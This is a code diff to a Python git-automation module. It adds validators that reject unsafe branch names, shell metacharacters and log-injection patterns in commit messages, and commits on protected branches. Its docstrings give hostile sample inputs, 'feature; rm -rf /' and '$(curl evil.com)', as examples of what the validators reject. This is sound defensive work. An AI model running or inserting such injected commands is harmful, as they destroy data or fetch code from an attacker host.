@@ -49,6 +49,8 @@ from agent_invoker import AgentInvoker
 from artifacts import ArtifactManager
 from git_operations import auto_commit_and_push
 from pr_automation import create_pull_request
+from security_utils import audit_log
+import security_utils  # Make accessible for testing
 
 
 def parse_consent_value(value: Optional[str]) -> bool:
@@ -455,6 +457,444 @@ def build_fallback_pr_command(
     return cmd
 
 
+def validate_git_state() -> bool:
+    """
+    Validate git repository state before operations.
+
+    Checks for:
+    - Detached HEAD state
+    - Protected branches (main, master)
+    - Not in a git repository
+
+    Returns:
+        True if state is valid for git operations
+
+    Raises:
+        ValueError: If git state is invalid
+
+    Security:
+        - Logs validation events to audit log
+        - Prevents operations on protected branches
+
+    Example:
+        >>> validate_git_state()
+        True
+    """
+    try:
+        # Check if in a git repository
+        result = subprocess.run(
+            ['git', 'rev-parse', '--is-inside-work-tree'],
+            capture_output=True,
+            text=True,
+            timeout=10,
+            check=False,
+        )
+
+        if result.returncode != 0:
+            audit_log(
+                event_type='git_state_validation',
+                status='rejected',
+                context={'reason': 'Not a git repository'},
+            )
+            raise ValueError(
+                'Not a git repository\n'
+                'Expected: Run this command inside a git repository\n'
+                'Initialize with: git init'
+            )
+
+    except subprocess.TimeoutExpired:
+        raise ValueError('Git command timed out')
+
+    # Get current branch name
+    try:
+        result = subprocess.run(
+            ['git', 'rev-parse', '--abbrev-ref', 'HEAD'],
+            capture_output=True,
+            text=True,
+            timeout=10,
+            check=True,
+        )
+        branch_name = result.stdout.strip()
+
+    except subprocess.TimeoutExpired:
+        raise ValueError('Git command timed out')
+    except subprocess.CalledProcessError as e:
+        raise ValueError(f'Failed to get branch name: {e}')
+
+    # Check for detached HEAD
+    if 'HEAD' in branch_name and 'detached' in branch_name.lower():
+        audit_log(
+            event_type='git_state_validation',
+            status='rejected',
+            context={'reason': 'Detached HEAD state', 'branch': branch_name},
+        )
+        raise ValueError(
+            'Cannot perform git operations in detached HEAD state\n'
+            'Expected: Switch to a branch first\n'
+            'Example: git checkout -b feature/my-feature'
+        )
+
+    # Also check git status for detached HEAD message
+    try:
+        result = subprocess.run(
+            ['git', 'status', '--short', '--branch'],
+            capture_output=True,
+            text=True,
+            timeout=10,
+            check=True,
+        )
+        status_output = result.stdout
+
+        if 'HEAD detached' in status_output or 'detached at' in status_output.lower():
+            audit_log(
+                event_type='git_state_validation',
+                status='rejected',
+                context={'reason': 'Detached HEAD detected in status'},
+            )
+            raise ValueError(
+                'Cannot perform git operations in detached HEAD state\n'
+                'Expected: Switch to a branch first\n'
+                'Example: git checkout -b feature/my-feature'
+            )
+
+    except subprocess.TimeoutExpired:
+        raise ValueError('Git status command timed out')
+    except subprocess.CalledProcessError as e:
+        raise ValueError(f'Failed to get git status: {e}')
+
+    # Check for protected branches
+    protected_branches = ['main', 'master']
+    if branch_name in protected_branches:
+        audit_log(
+            event_type='git_state_validation',
+            status='rejected',
+            context={'reason': 'Protected branch', 'branch': branch_name},
+        )
+        raise ValueError(
+            f'Cannot perform automated commits on protected branch: {branch_name}\n'
+            f'Expected: Create a feature branch first\n'
+            f'Example: git checkout -b feature/my-feature'
+        )
+
+    # Log successful validation
+    audit_log(
+        event_type='git_state_validation',
+        status='success',
+        context={'branch': branch_name},
+    )
+
+    return True
+
+
+def validate_branch_name(branch_name: str) -> str:
+    """
+    Validate branch name against security rules.
+
+    Prevents:
+    - CWE-78: Command injection via shell metacharacters
+    - Excessive length (>255 characters)
+    - Invalid characters
+
+    Args:
+        branch_name: Branch name to validate
+
+    Returns:
+        Validated branch name (unchanged if valid)
+
+    Raises:
+        ValueError: If branch name is invalid
+
+    Security:
+        - Whitelist: alphanumeric, dash, underscore, slash only
+        - Rejects shell metacharacters: $, `, |, &, ;, >, <, (, ), {, }
+        - Logs validation events to audit log
+
+    Example:
+        >>> validate_branch_name('feature/add-auth')
+        'feature/add-auth'
+        >>> validate_branch_name('feature; rm -rf /')
+        ValueError: Invalid branch name
+    """
+    # Check length
+    if len(branch_name) > 255:
+        audit_log(
+            event_type='branch_name_validation',
+            status='rejected',
+            context={'reason': 'Branch name too long', 'length': len(branch_name)},
+        )
+        raise ValueError(
+            f'Branch name too long: {len(branch_name)} characters\n'
+            f'Expected: Maximum 255 characters'
+        )
+
+    # Check for shell metacharacters (CWE-78 prevention)
+    dangerous_chars = ['$', '`', '|', '&', ';', '>', '<', '(', ')', '{', '}']
+    for char in dangerous_chars:
+        if char in branch_name:
+            audit_log(
+                event_type='branch_name_validation',
+                status='rejected',
+                context={
+                    'reason': 'Invalid characters (shell metacharacter)',
+                    'character': char,
+                    'branch_name': branch_name,
+                },
+            )
+            raise ValueError(
+                f'Invalid characters in branch name: {char}\n'
+                f'Expected: alphanumeric, dash, underscore, slash only'
+            )
+
+    # Whitelist validation: only allow alphanumeric, dash, underscore, slash, dot
+    import re
+    if not re.match(r'^[a-zA-Z0-9/._-]+$', branch_name):  # Added dot for release/v1.2.3
+        audit_log(
+            event_type='branch_name_validation',
+            status='rejected',
+            context={'reason': 'Invalid branch name format', 'branch_name': branch_name},
+        )
+        raise ValueError(
+            f'Invalid branch name: {branch_name}\n'
+            f'Expected: alphanumeric, dash, underscore, slash, dot only'
+        )
+
+    # Log successful validation
+    audit_log(
+        event_type='branch_name_validation',
+        status='success',
+        context={'branch_name': branch_name},
+    )
+
+    return branch_name
+
+
+def validate_commit_message(message: str) -> str:
+    """
+    Validate commit message against security rules.
+
+    Prevents:
+    - CWE-78: Command injection via shell metacharacters
+    - CWE-117: Log injection via newlines and control characters
+    - Excessive length (>10000 characters)
+
+    Args:
+        message: Commit message to validate
+
+    Returns:
+        Validated message (unchanged if valid)
+
+    Raises:
+        ValueError: If message is invalid
+
+    Security:
+        - Rejects shell metacharacters in first line: $, `, |, &, ;
+        - Rejects null bytes and control characters (log injection)
+        - Length limit: 10000 characters
+        - Logs validation events to audit log
+
+    Example:
+        >>> validate_commit_message('feat: add authentication')
+        'feat: add authentication'
+        >>> validate_commit_message('feat: auth\\n$(curl evil.com)')
+        ValueError: Invalid commit message
+    """
+    # Check length
+    if len(message) > 10000:
+        audit_log(
+            event_type='commit_message_validation',
+            status='rejected',
+            context={'reason': 'Commit message too long', 'length': len(message)},
+        )
+        raise ValueError(
+            f'Commit message too long: {len(message)} characters\n'
+            f'Expected: Maximum 10000 characters'
+        )
+
+    # Check for null bytes (CWE-117: log injection)
+    if '\x00' in message:
+        audit_log(
+            event_type='commit_message_validation',
+            status='rejected',
+            context={'reason': 'Null byte detected (log injection attempt)'},
+        )
+        raise ValueError(
+            'Invalid commit message: contains null byte\n'
+            'Expected: No control characters'
+        )
+
+    # Check first line for shell metacharacters (CWE-78 prevention)
+    # Note: We only check first line to allow markdown formatting in body
+    first_line = message.split('\n')[0]
+    dangerous_chars = ['$', '`', '|', '&', ';']
+    for char in dangerous_chars:
+        if char in first_line:
+            audit_log(
+                event_type='commit_message_validation',
+                status='rejected',
+                context={
+                    'reason': 'Shell metacharacter in first line',
+                    'character': char,
+                },
+            )
+            raise ValueError(
+                f'Invalid commit message: contains shell metacharacter {char}\n'
+                f'Expected: No shell metacharacters in first line'
+            )
+
+    # Check for log injection patterns (CWE-117)
+    # Reject messages that look like fake log entries
+    log_patterns = [
+        '\nINFO:',
+        '\nWARNING:',
+        '\nERROR:',
+        '\nDEBUG:',
+        '\r\nINFO:',
+        '\r\nERROR:',
+    ]
+    for pattern in log_patterns:
+        if pattern in message:
+            audit_log(
+                event_type='commit_message_validation',
+                status='rejected',
+                context={'reason': 'Log injection pattern detected', 'pattern': pattern},
+            )
+            raise ValueError(
+                f'Invalid commit message: contains log injection pattern\n'
+                f'Expected: No fake log entries'
+            )
+
+    # Log successful validation
+    audit_log(
+        event_type='commit_message_validation',
+        status='success',
+        context={'message_length': len(message)},
+    )
+
+    return message
+
+
+def check_git_credentials() -> bool:
+    """
+    Check git and gh CLI credentials are configured.
+
+    Validates:
+    - git user.name is configured
+    - git user.email is configured
+    - gh CLI is authenticated (optional, for PR creation)
+
+    Returns:
+        True if credentials are valid
+
+    Raises:
+        ValueError: If credentials are missing or invalid
+
+    Security:
+        - Logs validation events to audit log
+        - Does not expose credentials in logs
+
+    Example:
+        >>> check_git_credentials()
+        True
+    """
+    # Check git user.name
+    try:
+        result = subprocess.run(
+            ['git', 'config', 'user.name'],
+            capture_output=True,
+            text=True,
+            timeout=10,
+            check=False,
+        )
+
+        if result.returncode != 0 or not result.stdout.strip():
+            audit_log(
+                event_type='git_credentials_check',
+                status='rejected',
+                context={'reason': 'Git user.name not configured'},
+            )
+            raise ValueError(
+                'Git user.name not configured\n'
+                'Expected: Set git user.name\n'
+                'Example: git config --global user.name "Your Name"'
+            )
+
+    except subprocess.TimeoutExpired:
+        raise ValueError('Git config command timed out')
+
+    # Check git user.email
+    try:
+        result = subprocess.run(
+            ['git', 'config', 'user.email'],
+            capture_output=True,
+            text=True,
+            timeout=10,
+            check=False,
+        )
+
+        if result.returncode != 0 or not result.stdout.strip():
+            audit_log(
+                event_type='git_credentials_check',
+                status='rejected',
+                context={'reason': 'Git user.email not configured'},
+            )
+            raise ValueError(
+                'Git user.email not configured\n'
+                'Expected: Set git user.email\n'
+                'Example: git config --global user.email "you@example.com"'
+            )
+
+    except subprocess.TimeoutExpired:
+        raise ValueError('Git config command timed out')
+
+    # Check gh CLI authentication (optional, only warn)
+    try:
+        result = subprocess.run(
+            ['gh', 'auth', 'status'],
+            capture_output=True,
+            text=True,
+            timeout=10,
+            check=False,
+        )
+
+        if result.returncode != 0:
+            audit_log(
+                event_type='git_credentials_check',
+                status='warning',
+                context={'reason': 'gh CLI not authenticated (PR creation will fail)'},
+            )
+            # Don't raise - this is only required for PR creation
+            # Instead, let the PR creation step handle this error
+            raise ValueError(
+                'gh CLI not authenticated\n'
+                'Expected: Authenticate gh CLI for PR creation\n'
+                'Example: gh auth login'
+            )
+
+    except subprocess.TimeoutExpired:
+        raise ValueError('gh auth status command timed out')
+    except FileNotFoundError:
+        # gh not installed - this is OK, just won't create PRs
+        audit_log(
+            event_type='git_credentials_check',
+            status='warning',
+            context={'reason': 'gh CLI not installed'},
+        )
+        raise ValueError(
+            'gh CLI not installed\n'
+            'Expected: Install gh CLI for PR creation\n'
+            'See: https://cli.github.com'
+        )
+
+    # Log successful validation
+    audit_log(
+        event_type='git_credentials_check',
+        status='success',
+        context={},
+    )
+
+    return True
+
+
 def check_git_available() -> bool:
     """
     Check if git CLI is available.
@@ -837,8 +1277,9 @@ def push_and_create_pr(
 
 def execute_step8_git_operations(
     workflow_id: str,
-    branch: str,
     request: str,
+    branch: Optional[str] = None,
+    push: Optional[bool] = None,
     create_pr: bool = False,
     base_branch: str = 'main'
 ) -> Dict[str, Any]:
@@ -857,8 +1298,9 @@ def execute_step8_git_operations(
 
     Args:
         workflow_id: Unique workflow identifier
-        branch: Git branch name
         request: Feature request description
+        branch: Git branch name (optional, auto-detected if not provided)
+        push: Whether to push to remote (optional, uses consent if not provided)
         create_pr: Whether to attempt PR creation
         base_branch: Target branch for PR (default: 'main')
 
@@ -878,10 +1320,18 @@ def execute_step8_git_operations(
             - how_to_enable: Instructions to enable automation (if skipped)
 
     Examples:
+        >>> # Auto-detect branch
         >>> result = execute_step8_git_operations(
         ...     workflow_id='workflow-123',
-        ...     branch='feature/add-auth',
         ...     request='Add user authentication',
+        ...     push=True,
+        ...     create_pr=True
+        ... )
+        >>> # Explicit branch
+        >>> result = execute_step8_git_operations(
+        ...     workflow_id='workflow-123',
+        ...     request='Add user authentication',
+        ...     branch='feature/add-auth',
         ...     create_pr=True
         ... )
         >>> if result['success']:
@@ -891,6 +1341,10 @@ def execute_step8_git_operations(
     """
     # Step 1: Check consent
     consent = check_consent_via_env()
+
+    # If push parameter not provided, use consent
+    if push is None:
+        push = consent['push_enabled']
 
     if not consent['git_enabled']:
         return {
@@ -913,7 +1367,28 @@ def execute_step8_git_operations(
             )
         }
 
-    # Step 2: Validate git CLI is available
+    # Step 2: Auto-detect branch if not provided
+    if branch is None:
+        try:
+            result = subprocess.run(
+                ['git', 'rev-parse', '--abbrev-ref', 'HEAD'],
+                capture_output=True,
+                text=True,
+                timeout=10,
+                check=True,
+            )
+            branch = result.stdout.strip()
+        except (subprocess.CalledProcessError, subprocess.TimeoutExpired) as e:
+            return {
+                'success': False,
+                'error': f'Failed to detect git branch: {e}',
+                'commit_sha': '',
+                'pushed': False,
+                'pr_created': False,
+                'agent_invoked': False,
+            }
+
+    # Step 3: Validate git CLI is available
     if not check_git_available():
         return {
             'success': False,
@@ -930,12 +1405,12 @@ def execute_step8_git_operations(
             'pr_created': False
         }
 
-    # Step 3: Create commit with agent message
+    # Step 4: Create commit with agent message
     commit_result = create_commit_with_agent_message(
         workflow_id=workflow_id,
         request=request,
         branch=branch,
-        push=consent['push_enabled']
+        push=push  # Use explicit push parameter
     )
 
     # If commit failed, return early
@@ -956,7 +1431,7 @@ def execute_step8_git_operations(
             'next_steps': commit_result.get('manual_instructions', '')
         }
 
-    # Step 4: Optionally create PR
+    # Step 5: Optionally create PR
     pr_result = {'pr_created': False, 'pr_url': '', 'pr_number': None, 'pr_error': ''}
 
     if create_pr and consent['pr_enabled']:
